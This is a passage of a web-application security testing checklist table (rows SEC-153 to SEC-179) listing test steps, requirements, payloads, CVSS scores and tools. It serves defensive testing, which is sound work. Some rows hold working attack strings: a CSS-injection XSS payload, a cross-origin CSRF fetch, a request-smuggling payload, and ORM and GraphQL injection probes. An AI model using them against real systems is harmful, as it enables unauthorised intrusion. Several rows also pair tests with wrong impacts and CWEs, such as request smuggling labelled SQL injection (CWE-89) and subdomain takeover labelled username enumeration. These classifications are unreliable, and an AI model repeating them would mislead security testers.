| SEC-153 | Secret Scanning in Repositories | Information Disclosure (WSTG-INFO-05) | Vulnerability Scanning | 1. Scan code repositories for hardcoded secrets.<br>2. Check for API keys and passwords and tokens in source.<br>3. Scan git history for previously committed secrets.<br>4. Check environment files for sensitive data. | No secrets including API keys and passwords and tokens must be present in source code repositories or their history. | <code>Run GitLeaks;TruffleHog;git-secrets on repository;check .env files;scan git log for secret patterns</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | GitLeaks;TruffleHog;git-secrets;GitHub Secret Scanning | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| SEC-154 | Subdomain Enumeration and Takeover Testing | Security Misconfiguration (WSTG-CONF-01) | Penetration Testing | 1. Enumerate all subdomains of the target.<br>2. Check for dangling DNS records.<br>3. Test for subdomain takeover on unclaimed services.<br>4. Verify SSL certificates cover all active subdomains. | All subdomains must be properly maintained with no dangling DNS records that could allow subdomain takeover attacks. | <code>Run subfinder;amass;sublist3r;check for CNAME to unclaimed services;test S3;Heroku;Azure;GitHub Pages takeover</code> | Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | subfinder;amass;subjack;nuclei;Can-I-Take-Over-XYZ | CWE-204; [Account Takeover kit](#/checklist/ato); OWASP WSTG-IDNT-04 |
| SEC-155 | Cross-Origin Audit Log Correlation | Logging (WSTG-CONF-09) | Security Audit Logs | 1. Verify logs contain correlation IDs across services.<br>2. Check if distributed tracing is implemented.<br>3. Test log correlation during multi-step attacks.<br>4. Verify attack chain reconstruction capability. | Audit logs must support cross-service correlation through unique request IDs enabling attack chain reconstruction across distributed systems. | <code>Check for X-Request-ID or X-Correlation-ID in logs;verify same ID across API gateway;app server;database logs</code> | Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Manual Review;ELK Stack;Splunk | CWE-778; OWASP Logging &amp; Monitoring Failures (A09) |
| SEC-156 | CSRF on JSON API Endpoints | CSRF (WSTG-SESS-05) | CSRF Protection | 1. Identify JSON API endpoints that perform state changes.<br>2. Check if CSRF protection exists for JSON content type.<br>3. Test if changing to form content type bypasses CSRF.<br>4. Test with fetch API from cross-origin. | Application must implement CSRF protection for all state-changing API endpoints regardless of content type including JSON APIs. | <code>Create cross-origin page with fetch('https://target.com/api/action',{method:'POST',credentials:'include',headers:{'Content-Type':'text/plain'},body:JSON.stringify({data:'test'})})</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| SEC-157 | XSS via CSS Injection | Cross-Site Scripting (WSTG-INPV-02) | XSS Prevention | 1. Identify fields where user input affects CSS.<br>2. Inject CSS expressions and url() with JavaScript.<br>3. Test for CSS-based data exfiltration.<br>4. Check style attribute injection.<br>5. Test for behavior property injection. | Application must sanitize user input used in CSS contexts and restrict CSS injection vectors. | <code>style=background:url(javascript:alert(1));expression(alert(1));-moz-binding:url(evil.xml#xss);content:attr(data-secret)</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;Browser DevTools | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| SEC-158 | HTTP Request Smuggling Testing | Injection (WSTG-INPV-17) | Input Sanitization | 1. Test for CL.TE request smuggling.<br>2. Test for TE.CL smuggling.<br>3. Test for TE.TE with header obfuscation.<br>4. Test for HTTP/2 downgrade smuggling.<br>5. Verify front-end and back-end agreement on request boundaries. | Application and its infrastructure must handle Content-Length and Transfer-Encoding headers consistently to prevent request smuggling. | <code>CL.TE: Content-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED;TE.CL with obfuscated TE header</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite HTTP Request Smuggler;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| SEC-159 | Rate Limiting on OTP Verification | Authentication (WSTG-ATHN-03) | Rate Limiting | 1. Request an OTP.<br>2. Attempt to brute force the OTP with rapid submissions.<br>3. Check if rate limiting or lockout occurs after failed attempts.<br>4. Verify OTP length provides sufficient entropy against brute force. | Application must rate limit OTP verification attempts to 3-5 tries and lock out the OTP after exceeded attempts requiring a new OTP. | <code>Send 100+ POST /api/verify-otp with sequential 4-digit codes 0000-9999;check for lockout;verify OTP expiry after failures</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite Intruder;Custom Scripts | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-160 | Velocity Check Bypass Testing | Business Logic (WSTG-BUSL-01) | Fraud Detection | 1. Identify velocity-based fraud checks on transactions.<br>2. Test with transactions spaced just outside velocity windows.<br>3. Split transactions across multiple accounts.<br>4. Test with different payment methods. | Application must implement velocity checks that consider cross-account and cross-method patterns and not rely solely on single-dimension velocity. | <code>Send transactions just under velocity thresholds;split across accounts;alternate payment methods;test timing boundaries</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-840; PortSwigger Business logic |
| SEC-161 | Audit Log Export Security | Broken Access Control (WSTG-AUTHZ-02) | Security Audit Logs | 1. Check if audit log export is available.<br>2. Verify authorization on export endpoint.<br>3. Check for IDOR on log export.<br>4. Verify exported logs are encrypted.<br>5. Check for excessive data in exports. | Audit log export must require proper authorization and encrypt exported data and not expose logs through IDOR vulnerabilities. | <code>GET /api/audit-logs/export with regular user;GET /api/admin/audit-logs/export?user_id=all;check export encryption</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| SEC-162 | HTTPS Enforcement on API Endpoints | Transport Security (WSTG-CONF-07) | HTTPS Enforcement | 1. Access all API endpoints over HTTP.<br>2. Verify redirection to HTTPS.<br>3. Check if API data is served over HTTP even momentarily.<br>4. Verify API authentication tokens are not sent over HTTP. | All API endpoints must enforce HTTPS and never serve data or accept authentication tokens over plain HTTP connections. | <code>curl http://api.target.com/v1/users;curl http://target.com/api/data;verify no data returned before HTTPS redirect</code> | Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | cURL;Burp Suite;Wireshark | CWE-319; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-01 |
| SEC-163 | CSP frame-ancestors vs X-Frame-Options Conflict | Security Misconfiguration (WSTG-CONF-07) | Content Security Policy | 1. Check if both CSP frame-ancestors and X-Frame-Options are set.<br>2. Verify they have consistent values.<br>3. Check which takes precedence in different browsers.<br>4. Test for bypass through inconsistency. | Application must use consistent framing restrictions through CSP frame-ancestors (which takes precedence) and X-Frame-Options as fallback. | <code>Check for CSP frame-ancestors 'none' with X-Frame-Options: SAMEORIGIN conflict;verify browser behavior with both present</code> | Clickjacking of a sensitive action -&gt; UI-redress-driven state change. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;SecurityHeaders.com;Multiple Browsers | CWE-1021; [CSRF kit](#/checklist/csrf); OWASP Clickjacking; PortSwigger |
| SEC-164 | Initialization Vector (IV) Reuse Detection | Cryptography (WSTG-CRYP-01) | Encryption (At Rest / In Transit) | 1. Identify encryption implementations in the application.<br>2. Check for IV generation patterns.<br>3. Encrypt the same plaintext multiple times and compare ciphertexts.<br>4. Verify IV uniqueness per encryption operation. | Application must generate unique random IVs for every encryption operation and never reuse IVs with the same key. | <code>Encrypt same data multiple times and check if ciphertext changes;analyze IV patterns for predictability;check for static IVs</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Custom Scripts;CryptoAnalysis Tools | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| SEC-165 | Subdomain and Asset Discovery | Reconnaissance (WSTG-INFO-01) | Vulnerability Scanning | 1. Enumerate all subdomains and related assets.<br>2. Scan for development and staging environments.<br>3. Check for exposed internal tools.<br>4. Identify forgotten or legacy applications. | All internet-facing assets must be inventoried and maintained with no forgotten or unpatched development and staging environments exposed. | <code>Run subfinder;amass;shodan for asset discovery;check for dev.target.com;staging.target.com;admin.target.com</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | subfinder;amass;Shodan;Censys;httpx | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| SEC-166 | Error Handling and Information Leakage | Information Disclosure (WSTG-ERRH-01) | Penetration Testing | 1. Trigger various application errors.<br>2. Check for stack traces in error responses.<br>3. Look for database details and file paths and version numbers.<br>4. Test with invalid input types and methods.<br>5. Check debug mode status. | Application must return generic user-friendly error messages in production without exposing stack traces or internal system details. | <code>Send malformed requests;invalid content types;trigger 500 errors;check for framework debug pages;look for version disclosure</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| SEC-167 | Log Storage Security Assessment | Logging (WSTG-CONF-09) | Security Audit Logs | 1. Check where logs are stored.<br>2. Verify access controls on log storage.<br>3. Check if logs are accessible via web.<br>4. Verify log encryption in storage.<br>5. Check for log backup security. | Audit log storage must be secured with proper access controls and encryption and not be publicly accessible via web. | <code>Check /logs/;/var/log/;S3 bucket permissions for logs;verify log storage access controls;check backup security</code> | Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;DirBuster;AWS CLI | CWE-778; OWASP Logging &amp; Monitoring Failures (A09) |
| SEC-168 | CSRF Token Per-Request vs Per-Session | CSRF (WSTG-SESS-05) | CSRF Protection | 1. Capture CSRF token on first page load.<br>2. Submit multiple forms using the same token.<br>3. Check if the token changes per request.<br>4. Verify token rotation on sensitive operations.<br>5. Test token lifetime. | CSRF tokens should ideally be per-request for maximum security or at minimum per-session with proper binding. | <code>Use same CSRF token for 10+ sequential requests;check if token changes;compare per-request vs per-session behavior</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;Custom Scripts | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| SEC-169 | Content-Type Header XSS Prevention | Cross-Site Scripting (WSTG-INPV-01) | XSS Prevention | 1. Check Content-Type headers on all responses.<br>2. Upload files and check serving Content-Type.<br>3. Test if responses with wrong Content-Type allow XSS.<br>4. Verify charset specification. | All responses must include correct Content-Type headers with explicit charset to prevent Content-Type confusion XSS. | <code>Upload HTML file and check if served as text/html vs application/octet-stream;verify charset=UTF-8;check X-Content-Type-Options</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;Browser DevTools | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| SEC-170 | ORM Injection Testing | Injection (WSTG-INPV-05) | SQL Injection Prevention | 1. Identify if ORM is used for database operations.<br>2. Test for ORM-specific injection patterns.<br>3. Test for raw query usage within ORM.<br>4. Check for HQL/JPQL injection in Java apps.<br>5. Test for Sequelize/Mongoose injection in Node.js. | Application must use ORM safely without raw queries and protect against ORM-specific injection patterns. | <code>Test HQL: from User where name='test' OR '1'='1';Sequelize: {where:{[Op.or]:[{id:1},{id:{[Op.gt]:0}}]}};Django ORM filter bypass</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;SQLMap;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| SEC-171 | GraphQL Injection Testing | Injection (WSTG-INPV-01) | Input Sanitization | 1. Test for introspection query availability.<br>2. Test for field suggestion abuse.<br>3. Test for query batching DoS.<br>4. Test for nested query depth attack.<br>5. Check for directive injection. | GraphQL must disable introspection in production and implement query complexity limits and field-level authorization. | <code>{__schema{types{name;fields{name}}}};batch 100+ queries;nest 20+ levels deep;test directive @skip and @include injection</code> | GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | InQL;GraphQL Voyager;Burp Suite;Altair | CWE-400; [IDOR kit](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger |
| SEC-172 | Account Lockout Testing | Authentication (WSTG-ATHN-03) | Rate Limiting | 1. Attempt multiple failed logins for a specific account.<br>2. Count attempts before lockout.<br>3. Check lockout duration.<br>4. Verify if lockout applies to valid accounts only.<br>5. Test for lockout bypass via API variations. | Application must implement account lockout after 5-10 failed attempts with increasing lockout duration and notification to the account owner. | <code>Send 20 failed login attempts;check at which attempt lockout triggers;verify lockout duration;test for bypass via different endpoints</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Intruder;Hydra;Custom Scripts | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-173 | IP Block Notification and Logging | Logging (WSTG-CONF-09) | IP Blocking | 1. Trigger IP blocking.<br>2. Verify the blocking event is logged.<br>3. Check if admin is notified of blocking events.<br>4. Verify the blocked IP is recorded.<br>5. Check for blocking reason documentation. | IP blocking events must be logged with full details including blocked IP and reason and timestamp and admin notifications for significant blocks. | <code>Trigger IP block and verify audit log entry with blocked_ip;block_reason;timestamp;triggered_by;verify admin alert</code> | Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Manual Review;Log Analysis Tools | CWE-778; OWASP Logging &amp; Monitoring Failures (A09) |
| SEC-174 | Chargeback Fraud Detection Testing | Business Logic (WSTG-BUSL-01) | Fraud Detection | 1. Complete a purchase and request chargeback.<br>2. Check if fraud detection flags the chargeback.<br>3. Test multiple chargeback patterns.<br>4. Verify account restrictions after chargebacks. | Application must detect and flag chargeback fraud patterns and implement appropriate account restrictions for repeated chargebacks. | <code>Complete purchase;initiate chargeback;attempt new purchase;check for fraud_flag;verify account restriction after multiple chargebacks</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Manual Testing;Burp Suite | CWE-840; PortSwigger Business logic |
| SEC-175 | CSP Trusted Types Evaluation | Security Misconfiguration (WSTG-CONF-07) | Content Security Policy | 1. Check if CSP includes Trusted Types enforcement.<br>2. Verify require-trusted-types-for 'script' directive.<br>3. Test if DOM XSS sinks are protected by Trusted Types.<br>4. Check for Trusted Types policy configuration. | Application should implement CSP Trusted Types to prevent DOM XSS by requiring safe type creation for dangerous sinks like innerHTML. | <code>Check for require-trusted-types-for 'script';trusted-types default;test innerHTML assignment without TrustedHTML</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Browser DevTools;Burp Suite | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-176 | Cryptographic Random Number Generation | Cryptography (WSTG-CRYP-01) | Encryption (At Rest / In Transit) | 1. Identify all random number generation in the application.<br>2. Check if Math.random() or similar weak PRNGs are used for security functions.<br>3. Verify CSPRNG usage for tokens and keys.<br>4. Test random number entropy. | Application must use cryptographically secure random number generators (CSPRNG) for all security-critical operations including token and key generation. | <code>Check source for Math.random();rand();mt_rand() used for tokens/keys;verify use of crypto.randomBytes();SecureRandom;os.urandom()</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Source Code Review;Burp Suite Sequencer | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| SEC-177 | DAST Integration in CI/CD Pipeline | Vulnerability Assessment (WSTG-INFO-08) | Vulnerability Scanning | 1. Verify DAST scanning is integrated in CI/CD.<br>2. Check scan frequency and trigger conditions.<br>3. Verify scan results are reviewed and actioned.<br>4. Check for automated blocking of critical findings. | DAST scanning must be integrated into the CI/CD pipeline with automated blocking of deployments containing critical vulnerabilities. | <code>Verify OWASP ZAP or Burp Suite Enterprise integration in CI/CD;check scan policies;verify gating criteria</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | OWASP ZAP;Burp Suite Enterprise;GitLab DAST;GitHub Actions | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-178 | Race Condition Testing Across All Critical Functions | Business Logic (WSTG-BUSL-08) | Penetration Testing | 1. Identify all critical operations like payments and transfers and redemptions.<br>2. Send concurrent requests to each operation.<br>3. Check for double-processing.<br>4. Verify atomic transaction handling.<br>5. Test with varying concurrency levels. | All critical operations must be atomic and idempotent preventing any form of double-processing through race conditions. | <code>Send 50 concurrent POST /api/payment requests;concurrent POST /api/transfer;concurrent POST /api/redeem using Turbo Intruder</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Turbo Intruder;Burp Suite;Custom Scripts;race-the-web | CWE-362; [Race Condition kit](#/checklist/racecondition); James Kettle Smashing the State Machine |
| SEC-179 | Security Event Alerting Verification | Logging (WSTG-CONF-09) | Security Audit Logs | 1. Trigger critical security events like brute force and privilege escalation and data exfiltration patterns.<br>2. Verify real-time alerts are generated.<br>3. Check alert notification channels.<br>4. Verify alert response procedures. | Critical security events must trigger real-time alerts to security team through configured notification channels with response procedures. | <code>Trigger 10 failed logins;attempt privilege escalation;bulk data export;verify SIEM alert generation and notification</code> | Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Manual Testing;SIEM;Log Analysis Tools | CWE-778; OWASP Logging &amp; Monitoring Failures (A09) |
